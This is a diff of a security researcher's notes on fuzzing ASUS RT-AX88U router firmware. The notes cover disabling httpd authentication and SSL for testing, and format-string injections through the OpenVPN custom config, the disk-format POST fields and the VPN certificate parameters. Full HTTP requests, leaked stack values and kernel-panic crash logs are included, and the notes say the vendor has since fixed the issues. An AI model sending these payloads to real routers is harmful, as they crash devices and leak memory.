@@ -596,6 +596,67 @@ File not found.
 
 It's writing it's output after the input, and *doesn't* crash. Not sure if that's good or bad for this, probably bad, but I still fuzzed.
 
+### Extra httpd.c source modification notes
+
+A couple changes need to be made to the source in addition to the above stuff
+
+1. Disable cert creation / SSL stuff, line 2379, httpd.c:
+```C
+#ifdef RTCONFIG_HTTPS
+	//if (do_ssl)
+		//start_ssl(http_port); //Comment this out
+#endif
+```
+
+2. Disable Auth:
+Comment out all `send_login_page` calls in httpd.c, e.g.
+```C
+// if(login_state==3 && !fromapp) { // few pages can be shown even someone else login
+// 	 if(handler->auth || (!strncmp(file, "Main_Login.asp", 14) && login_error_status != 9) || mime_exception&MIME_EXCEPTION_NOPASS)
+// 	{
+// 		if(strcasecmp(method, "post") == 0 && handler->input)	//response post request
+// 			while (cl--) (void)fgetc(conn_fp);
+
+// 		send_login_page(fromapp, NOLOGIN, NULL, NULL, 0, NOLOGINTRY);
+// 		return;
+// 	}
+// }
+```
+
+3. Match + Replace rule in burp
+Lastly, some DOM crap happens which redirects you to the change password page by default, easy to fix, just make a burp match/replace rule for:
+`var notice_pw_is_default = '1';` replaced to `var notice_pw_is_default = '0';`
+
+
+### format string - Advanced_VPN_OpenVPN.asp
+
+Sending this within the Custom Configuration:
+```
+push "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+push "%4881$p"
+```
+results in this in the syslog:
+```
+# cat /etc/openvpn/server1/config.ovpn
+...
+# Custom Configuration
+push "AAAA0x43843c000xffa290800xffa290840xffa29088(nil)0xf7546ab8(nil)(nil)(nil)0xffa290ac(nil)0xf7546ab80x10xffa290ac0x5f6e70760x767265730x5f317265(nil)"
+push "(nil)"
+```
+
+stack to 4881 is mostly null, 4882 first values I noticed
+
+```
+# Custom Configuration
+push "AAAA0x43843c000xffa290800xffa290840xffa29088(nil)0xf7546ab8(nil)(nil)(nil)0xffa290ac(nil)0xf7546ab80x10xffa290ac0x5f6e70760x767265730x5f317265(nil)"
+push "0x4c"
+```
+
+
+
+
+
+
 
 ### AFL -> httpd
 
@@ -1403,3 +1464,234 @@ Next, created a directory of 512 byte hex files with different headers
 Sadly there's just not a lot of functionality in this binary :/
 
 
+## disk_monitor
+
+Found a crash in disk_monitor:
+
+```
+POST /start_apply.htm HTTP/1.1
+Host: 192.168.1.2
+Content-Length: 186
+Origin: http://192.168.1.2
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+Cookie: hwaddr=3C:7C:3F:53:C1:00; apps_last=; clickedItem_tab=0; asus_token=E1pZ1zgYygoSNU8TFgr7XyZReQG5Tu8
+Connection: close
+
+next_page=%2Fdevice-map%2Fdisk_format.asp&action_mode=apply&action_script=start_diskformat&action_wait=1&diskformat_file_system=%25n&diskformat_label=test&disk_name=test&disk_system=tfat
+```
+
+`%25n` in diskformat_file_system
+
+Syslog:
+
+```
+Mar 14 16:23:12 rc_service: httpd 1438:notify_rc start_diskformat
+Mar 14 16:23:12 disk_monitor: Format manually...
+Mar 14 16:23:12 disk monitor: start...
+Mar 14 16:23:12 iTunes: daemon is stoped
+Mar 14 16:23:12 FTP Server: daemon is stopped
+Mar 14 16:23:12 Samba Server: smb daemon is stopped
+Mar 14 16:23:16 Timemachine: daemon is stoped
+Mar 14 16:23:16 disk monitor: unmount partition
+Mar 14 16:23:16 disk monitor: format partition
+Mar 14 16:23:16 avahi-daemon[3477]: WARNING: No NSS support for mDNS detected, consider installing nss-mdns!
+Mar 14 16:23:16 kernel: CPU: 2 PID: 1481 Comm: disk_monitor Tainted: P           O    4.1.51 #4
+Mar 14 16:23:16 kernel: Hardware name: Broadcom-v8A (DT)
+Mar 14 16:23:16 kernel: task: ffffffc02ff3ebc0 ti: ffffffc02b9fc000 task.ti: ffffffc02b9fc000
+Mar 14 16:23:16 kernel: PC is at 0xf6cf09c8
+Mar 14 16:23:16 kernel: LR is at 0xf6d26248
+Mar 14 16:23:16 kernel: pc : [<00000000f6cf09c8>] lr : [<00000000f6d26248>] pstate: 60070010
+Mar 14 16:23:16 kernel: sp : 00000000ffa2c6d0
+Mar 14 16:23:16 kernel: x12: 00000000002ebdf4 
+Mar 14 16:23:16 kernel: x11: 00000000ffa2cbc4 x10: 0000000000000000 
+Mar 14 16:23:16 kernel: x9 : 00000000f6dea7a8 x8 : 00000000f6dec000 
+Mar 14 16:23:16 kernel: x7 : 00000000f765f860 x6 : 0000000000000024 
+Mar 14 16:23:16 kernel: x5 : 00000000ffa2cc8c x4 : 00000000002e86e8 
+Mar 14 16:23:16 kernel: x3 : 0000000000000001 x2 : 00000000ffa2cc84 
+Mar 14 16:23:16 kernel: x1 : 00000000f6cefb34 x0 : 0000000000000024 
+Mar 14 16:23:17 avahi-daemon[3477]: Alias name "RT-AX88U" successfully established.
+Mar 14 16:23:46 bsd: bsd: Sending act Frame to 58:ce:2a:4a:49:1c with transition target eth7 ssid 3c:7c:3f:53:c1:04
+Mar 14 16:23:46 bsd: bsd: BSS Transit Response: ifname=eth6, event=156, token=1c, status=0, mac=3c:7c:3f:53:c1:04
+Mar 14 16:23:46 bsd: bsd: BSS Transit Response: STA accept
+```
+
+
+## VPN Server Config
+
+### 1
+
+5/28/23
+
+New crashes / format strings in the actual VPN config files. Advanced VPN Config, modify POST params:
+
+Vulnerable parameters:
+`vpn_server_cipher`
+`vpn_server_digest`
+
+Syslog Output:
+```
+May 28 10:29:16 rc_service: httpd 2726:notify_rc restart_openvpnd;restart_chpass;restart_samba
+May 28 10:29:17 vpnserver1[7115]: OpenVPN 2.4.12 arm-buildroot-linux-gnueabi [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD] built on May 15 2023
+May 28 10:29:17 vpnserver1[7115]: library versions: OpenSSL 1.1.1n  15 Mar 2022, LZO 2.03
+May 28 10:29:17 vpnserver1[7116]: WARNING: using --duplicate-cn and --client-config-dir together is probably not what you want
+May 28 10:29:17 vpnserver1[7116]: NOTE: your local LAN uses the extremely common subnet address 192.168.0.x or 192.168.1.x.  Be aware that this might create routing conflicts if you connect to the VPN server from public locations such as internet cafes that use the same subnet.
+May 28 10:29:17 vpnserver1[7116]: NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
+May 28 10:29:17 vpnserver1[7116]: PLUGIN_INIT: POST /usr/lib/openvpn-plugin-auth-pam.so '[/usr/lib/openvpn-plugin-auth-pam.so] [openvpn]' intercepted=PLUGIN_AUTH_USER_PASS_VERIFY 
+May 28 10:29:17 vpnserver1[7116]: Diffie-Hellman initialized with 2048 bit key
+May 28 10:29:17 vpnserver1[7116]: Cipher AAAA0xe0c7d6000xffadc8c00xffadc not supported
+May 28 10:29:17 vpnserver1[7116]: Exiting due to fatal error
+```
+
+### 2
+
+More crashes / weird shit when submitting tainted certificates. Kernel panic!
+
+Caused by including things like "%p%p%p%p" in the certificate config, breaks VPN again.
+
+Request Param:
+`vpn_crt_server1_ca=-----BEGIN+CERTIFICATE-----%25p%25p%25p%25p%25p[...]`
+
+```
+May  5 01:05:02 crashlog: <6>tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
+May  5 01:05:02 crashlog: <6>IPv6: ADDRCONF(NETDEV_UP): tun21: link is not ready
+May  5 01:05:02 crashlog: <6>IPv6: ADDRCONF(NETDEV_UP): tun21: link is not ready
+May  5 01:05:02 crashlog: <6>device tun21 entered promiscuous mode
+May  5 01:05:02 crashlog: <6>potentially unexpected fatal signal 11.
+May  5 01:05:02 crashlog: <4>
+May  5 01:05:02 crashlog: <4>CPU: 1 PID: 1 Comm: init Tainted: P           O    4.1.51 #4
+May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
+May  5 01:05:02 crashlog: <4>task: ffffffc03e85d440 ti: ffffffc03e860000 task.ti: ffffffc03e860000
+May  5 01:05:02 crashlog: <4>PC is at 0xf6f22624
+May  5 01:05:02 crashlog: <4>LR is at 0xf6c40fc0
+May  5 01:05:02 crashlog: <4>pc : [<00000000f6f22624>] lr : [<00000000f6c40fc0>] pstate: 60070010
+May  5 01:05:02 crashlog: <4>sp : 00000000ff956590
+May  5 01:05:02 crashlog: <4>x12: 00000000f6f22618 
+May  5 01:05:02 crashlog: <4>x11: 0000000000000003 x10: 0000000000000000 
+May  5 01:05:02 crashlog: <4>x9 : 00000000ff957f6c x8 : 0000000000000000 
+May  5 01:05:02 crashlog: <4>x7 : 000000000036ca48 x6 : 00000000ff956d90 
+May  5 01:05:02 crashlog: <4>x5 : 0000000000000001 x4 : 0000000000000400 
+May  5 01:05:02 crashlog: <4>x3 : 00000000000002e0 x2 : 00000000f6fab000 
+May  5 01:05:02 crashlog: <4>x1 : 0000000000000001 x0 : 0000000000000000 
+May  5 01:05:02 crashlog: <4>
+May  5 01:05:02 crashlog: <0>Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b
+May  5 01:05:02 crashlog: <0>
+May  5 01:05:02 crashlog: <4>CPU: 1 PID: 1 Comm: init Tainted: P           O    4.1.51 #4
+May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
+May  5 01:05:02 crashlog: <0>Call trace:
+May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
+May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
+May  5 01:05:02 crashlog: <4>[<ffffffc0005199e4>] panic+0xd8/0x220
+May  5 01:05:02 crashlog: <4>[<ffffffc000095360>] complete_and_exit+0x0/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc00009617c>] do_group_exit+0x3c/0xd8
+May  5 01:05:02 crashlog: <4>[<ffffffc0000a1198>] get_signal+0x260/0x4e8
+May  5 01:05:02 crashlog: <4>[<ffffffc000086c94>] do_signal+0x194/0x4f8
+May  5 01:05:02 crashlog: <4>[<ffffffc0000871ec>] do_notify_resume+0x64/0x70
+May  5 01:05:02 crashlog: <2>CPU3: stopping
+May  5 01:05:02 crashlog: <4>CPU: 3 PID: 0 Comm: swapper/3 Tainted: P           O    4.1.51 #4
+May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
+May  5 01:05:02 crashlog: <0>Call trace:
+May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
+May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
+May  5 01:05:02 crashlog: <4>[<ffffffc00008df10>] handle_IPI+0x190/0x1a0
+May  5 01:05:02 crashlog: <4>[<ffffffc000080c68>] gic_handle_irq+0x88/0x90
+May  5 01:05:02 crashlog: <4>Exception stack(0xffffffc03e8d7dc0 to 0xffffffc03e8d7ef0)
+May  5 01:05:02 crashlog: <4>7dc0: d288f5e0 0000002d 00000000 00000080 3e8d7f10 ffffffc0 00370adc ffffffc0
+May  5 01:05:02 crashlog: <4>7de0: d288f5e0 0000002d 10000000 000572a5 0000d978 00000000 14000000 00000000
+May  5 01:05:02 crashlog: <4>7e00: 0004c520 00000000 00000018 00000000 b0000000 000561a7 ebd06574 0000002d
+May  5 01:05:02 crashlog: <4>7e20: 3e8c3070 ffffffc0 3e8d7ec0 ffffffc0 0052e548 ffffffc0 00004a9e 00000000
+May  5 01:05:02 crashlog: <4>7e40: 00000000 00000000 f6d33d78 00000000 f6d38920 00000000 00000000 00000000
+May  5 01:05:02 crashlog: <4>7e60: 00185ff8 ffffffc0 00000000 00000000 00000000 00000000 d288f5e0 0000002d
+May  5 01:05:02 crashlog: <4>7e80: 3ffe42f8 ffffffc0 00000001 00000000 00000001 00000000 d27e18dc 0000002d
+May  5 01:05:02 crashlog: <4>7ea0: 3e8d4000 ffffffc0 007c2000 ffffffc0 006f5000 ffffffc0 3ffe42f8 ffffffc0
+May  5 01:05:02 crashlog: <4>7ec0: 00731d90 ffffffc0 3e8d7f10 ffffffc0 00370ad4 ffffffc0 3e8d7f10 ffffffc0
+May  5 01:05:02 crashlog: <4>7ee0: 00370adc ffffffc0 60000145 00000000
+May  5 01:05:02 crashlog: <4>[<ffffffc000083f00>] el1_irq+0x80/0xf8
+May  5 01:05:02 crashlog: <4>[<ffffffc000370be0>] cpuidle_enter+0x18/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc0000c649c>] cpu_startup_entry+0x1ec/0x250
+May  5 01:05:02 crashlog: <4>[<ffffffc00008d990>] secondary_start_kernel+0x150/0x178
+May  5 01:05:02 crashlog: <2>CPU0: stopping
+May  5 01:05:02 crashlog: <4>CPU: 0 PID: 0 Comm: swapper/0 Tainted: P           O    4.1.51 #4
+May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
+May  5 01:05:02 crashlog: <0>Call trace:
+May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
+May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
+May  5 01:05:02 crashlog: <4>[<ffffffc00008df10>] handle_IPI+0x190/0x1a0
+May  5 01:05:02 crashlog: <4>[<ffffffc000080c68>] gic_handle_irq+0x88/0x90
+May  5 01:05:02 crashlog: <4>Exception stack(0xffffffc0006fbd70 to 0xffffffc0006fbea0)
+May  5 01:05:02 crashlog: <4>bd60:                                     d288f5f4 0000002d 00000000 00000080
+May  5 01:05:02 crashlog: <4>bd80: 006fbec0 ffffffc0 00370adc ffffffc0 d288f5f4 0000002d 24000000 000572a5
+May  5 01:05:02 crashlog: <4>bda0: 0000d979 00000000 14000000 00000000 0004c520 00000000 00000018 00000000
+May  5 01:05:02 crashlog: <4>bdc0: b0000000 000561a7 eba49b4c 0000002d 0070a9f0 ffffffc0 fffe6ce6 00000000
+May  5 01:05:02 crashlog: <4>bde0: 00000002 00000000 ffcf0eec 00000000 00000000 00000000 ffcf0688 00000000
+May  5 01:05:02 crashlog: <4>be00: 00013378 00000000 00000000 00000000 003f8ce0 ffffffc0 00000000 00000000
+May  5 01:05:02 crashlog: <4>be20: 00000000 00000000 d288f5f4 0000002d 3ffb72f8 ffffffc0 00000001 00000000
+May  5 01:05:02 crashlog: <4>be40: 00000001 00000000 d27731fc 0000002d 006f8000 ffffffc0 007c2000 ffffffc0
+May  5 01:05:02 crashlog: <4>be60: 006f5000 ffffffc0 3ffb72f8 ffffffc0 00731d90 ffffffc0 006fbec0 ffffffc0
+May  5 01:05:02 crashlog: <4>be80: 00370ad4 ffffffc0 006fbec0 ffffffc0 00370adc ffffffc0 60000145 00000000
+May  5 01:05:02 crashlog: <4>[<ffffffc000083f00>] el1_irq+0x80/0xf8
+May  5 01:05:02 crashlog: <4>[<ffffffc000370be0>] cpuidle_enter+0x18/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc0000c649c>] cpu_startup_entry+0x1ec/0x250
+May  5 01:05:02 crashlog: <4>[<ffffffc0005169b0>] rest_init+0x88/0x98
+May  5 01:05:02 crashlog: <4>[<ffffffc0006be96c>] start_kernel+0x390/0x3a4
+May  5 01:05:02 crashlog: <2>CPU2: stopping
+May  5 01:05:02 crashlog: <4>CPU: 2 PID: 2961 Comm: hotplug Tainted: P           O    4.1.51 #4
+May  5 01:05:02 crashlog: <4>Hardware name: Broadcom-v8A (DT)
+May  5 01:05:02 crashlog: <0>Call trace:
+May  5 01:05:02 crashlog: <4>[<ffffffc000087658>] dump_backtrace+0x0/0x150
+May  5 01:05:02 crashlog: <4>[<ffffffc0000877bc>] show_stack+0x14/0x20
+May  5 01:05:02 crashlog: <4>[<ffffffc00051bd10>] dump_stack+0x90/0xb0
+May  5 01:05:02 crashlog: <4>[<ffffffc00008df10>] handle_IPI+0x190/0x1a0
+May  5 01:05:02 crashlog: <4>[<ffffffc000080c68>] gic_handle_irq+0x88/0x90
+May  5 01:05:02 crashlog: <4>Exception stack(0xffffffc02b65f910 to 0xffffffc02b65fa40)
+May  5 01:05:02 crashlog: <4>f900:                                     007d6000 ffffffc0 00000000 00000080
+May  5 01:05:02 crashlog: <4>f920: 2b65fa60 ffffffc0 000cc020 ffffffc0 00400008 00000000 2b65c000 ffffffc0
+May  5 01:05:02 crashlog: <4>f940: 00008640 ffffff80 00395730 ffffffc0 00000007 00000000 00000003 00000000
+May  5 01:05:02 crashlog: <4>f960: 00395638 ffffffc0 006ff980 ffffffc0 00000006 00000000 007d6b40 ffffffc0
+May  5 01:05:02 crashlog: <4>f980: 00000286 00000000 00000000 00000000 00000006 00000000 f6e4ae18 00000000
+May  5 01:05:02 crashlog: <4>f9a0: f6e4b920 00000000 00000000 00000000 000f5610 ffffffc0 00000000 00000000
+May  5 01:05:02 crashlog: <4>f9c0: 00000000 00000000 007d6000 ffffffc0 00710000 ffffffc0 007d367c ffffffc0
+May  5 01:05:02 crashlog: <4>f9e0: 00000140 00000000 00000001 00000000 00000021 00000000 006fe000 ffffffc0
+May  5 01:05:02 crashlog: <4>fa00: 007c6c40 ffffffc0 fffe6cf1 00000000 00000004 00000000 2b65fa60 ffffffc0
+May  5 01:05:02 crashlog: <4>fa20: 000cc01c ffffffc0 2b65fa60 ffffffc0 000cc020 ffffffc0 60000145 00000000
+May  5 01:05:02 crashlog: <4>[<ffffffc000083f00>] el1_irq+0x80/0xf8
+May  5 01:05:02 crashlog: <4>[<ffffffc0000cc9f0>] console_device+0x70/0x80
+May  5 01:05:02 crashlog: <4>[<ffffffc00030b1c4>] tty_open+0x29c/0x510
+May  5 01:05:02 crashlog: <4>[<ffffffc000142468>] chrdev_open+0x98/0x198
+May  5 01:05:02 crashlog: <4>[<ffffffc00013be94>] do_dentry_open.isra.1+0x1c4/0x2f0
+May  5 01:05:02 crashlog: <4>[<ffffffc00013cdd0>] vfs_open+0x50/0x60
+May  5 01:05:02 crashlog: <4>[<ffffffc00014ba2c>] do_last.isra.13+0x2dc/0xc20
+May  5 01:05:02 crashlog: <4>[<ffffffc00014c3f4>] path_openat+0x84/0x5c0
+May  5 01:05:02 crashlog: <4>[<ffffffc00014da28>] do_filp_open+0x30/0x98
+May  5 01:05:02 crashlog: <4>[<ffffffc00013d1e0>] do_sys_open+0x148/0x230
+May  5 01:05:02 crashlog: <4>[<ffffffc000185dcc>] compat_SyS_openat+0xc/0x18
+May  5 01:05:02 crashlog: 
+May  5 01:05:02 crashlog: 
+May  5 01:05:02 crashlog: 
+May  5 01:05:02 crashlog: 
+May  5 01:05:02 crashlog: 
+May  5 01:05:02 kernel: ^[[0;33;41m[ERROR pktrunner] runnerUcast_inet6addr_event,187: Could not rdpa_system_ipv6_host_address_table_find ret=-5^[[0m
+May  5 01:05:02 kernel: port_generic_open 536 skip turnning on power on eth0 here
+May  5 01:05:02 kernel: IGMP Query send failed
+May  5 01:05:02 kernel: IGMP Query send failed
+May  5 01:05:02 kernel: eth5 (Ext switch port: 7) (Logical Port: 15) (phyId: 1e) Link UP at 1000 mbps full duplex
+May  5 01:05:02 kernel: <=== Deactivate Deep Green Mode
+May  5 01:05:04 rc_service: service 1076:notify_rc restart_firewall
+May  5 01:05:04 acsd: eth6: Selecting 2g band ACS policy
+May  5 01:05:04 wlceventd: main(1074): wlceventd Start...
+May  5 01:05:04 RT-AX88U: start httpd:80
+May  5 01:05:04 avahi-daemon[1134]: WARNING: No NSS support for mDNS detected, consider installing nss-mdns!
+May  5 01:05:04 httpd: Save SSL certificate...80
+May  5 01:05:04 httpd: mssl_cert_key_match : PASS
+May  5 01:05:05 disk monitor: be idle
+May  5 01:05:05 jffs2: valid logs(1)
+May  5 01:05:05 Mastiff: init
+```
+
+
+6/6/23
+
+Beta Firmware Received, format strings are addressed.
